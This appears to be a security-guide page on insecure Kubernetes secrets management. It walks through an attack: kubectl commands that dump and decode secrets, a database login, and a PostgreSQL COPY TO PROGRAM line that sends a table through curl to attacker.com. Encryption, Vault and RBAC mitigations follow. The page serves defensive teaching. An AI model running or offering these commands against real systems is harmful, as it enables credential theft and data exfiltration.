---
sidebar_position: 5
title: Insecure Secrets Management
description: Understanding the risks of insecure secrets management in Kubernetes and best practices to securely handle sensitive data.
---

# Insecure Secrets Management

Insecure secrets management in Kubernetes can lead to the exposure of sensitive data, such as API keys, database credentials, and certificates. Storing secrets in plaintext or using insecure backends increases the risk of unauthorized access by attackers.

---

## Exploitation Steps: Accessing Insecurely Stored Secrets

An attacker can identify Kubernetes Secrets stored in plaintext using the following command:

```bash
kubectl get secrets -o yaml
```

### 1. Decode a Kubernetes Secret

The attacker extracts and decodes a Base64-encoded secret:

```bash
kubectl get secret db-secret -o go-template='{{.data.password|base64decode}}'
```

### 2. Access Sensitive Services Using Exposed Credentials

The attacker uses the decoded credentials to access a database:

```bash
psql -h <database-ip> -U admin -W
```

### 3. Exfiltrate Data from the Database

The attacker exports sensitive data from the database to an external server:

```sql
COPY (SELECT * FROM sensitive_data) TO PROGRAM 'curl -X POST -d @- http://attacker.com/upload';
```

### Result

The attacker can access and exfiltrate sensitive data, potentially causing data breaches and regulatory compliance violations.

---

## Mitigation Techniques and Fixes

### 1. Encrypt Secrets at Rest

**Issue:** Secrets stored in etcd are not encrypted by default.<br>
**Fix:** Enable encryption at rest in the Kubernetes configuration.

#### Example Encryption Configuration for etcd

```yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources:
  - secrets
  providers:
  - aescbc:
      keys:
      - name: key1
        secret: c2VjcmV0LWtleS1mb3ItZW5jcnlwdGlvbg==
  - identity: {}
```

### 2. Use External Secret Management Solutions

**Issue:** Kubernetes Secrets alone do not provide advanced security features.<br>
**Fix:** Integrate with external secret management tools like HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault.

#### Example of Using External Secrets with Kubernetes

```yaml
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: vault-secrets
spec:
  provider: vault
  parameters:
    vaultAddress: "https://vault.example.com"
    roleName: "k8s-role"
    objects: |
      array:
        - objectName: "db-password"
          secretPath: "secret/data/db"
          secretKey: "password"
```

### 3. Limit Access to Secrets with RBAC

**Issue:** Lack of access controls allows unauthorized access to secrets.<br>
**Fix:** Implement Role-Based Access Control (RBAC) to restrict secret access.

#### Example of RBAC Policy for Secret Access

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: secret-reader
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-secrets
  namespace: default
subjects:
- kind: ServiceAccount
  name: secret-reader-sa
roleRef:
  kind: Role
  name: secret-reader
  apiGroup: rbac.authorization.k8s.io
```

---

## Conclusion

To securely manage Kubernetes secrets:

- Always enable encryption at rest using etcd encryption.
- Utilize external secret management solutions for enhanced security.
- Apply RBAC policies to restrict access to sensitive data.
